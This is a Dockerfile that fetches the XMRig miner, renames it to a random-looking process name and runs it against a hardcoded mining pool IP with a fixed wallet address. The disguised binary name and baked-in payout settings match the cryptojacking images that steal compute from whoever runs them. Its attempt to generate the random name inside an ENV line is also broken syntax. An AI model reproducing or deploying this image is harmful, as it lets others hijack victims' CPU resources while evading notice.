FROM ubuntu:16.04

ENV VERSION 4.6.2-beta

ENV a 'mxsemsdnlkdj-' && b $(shuf -i10-375 -n1) && c '-' && d $(shuf -i10-259 -n1) && cpuname $a$b$c$d

RUN apt-get update && apt-get install -y wget


RUN wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-xenial-x64.tar.gz
RUN tar -xvzf xmrig-$VERSION-xenial-x64.tar.gz
RUN cp xmrig "$cpuname"

ENV POOL 158.101.6.131:2222
ENV USERNAME WW3WA6yBf594aYQ8JMvxuXEXQdQ21MzLuRKW83nWYNz3eHTSBBKA6UxVCViF9vkcLdbrjEtcVUYEDfuQ9J7ksbci14R9ATjyu
ENV DONATE 1
ENV THREADS 4

CMD ./"${cpuname}" -o $POOL -u $USERNAME -p x -a rx/wow -k --donate-level=$DONATE -t $THREADS
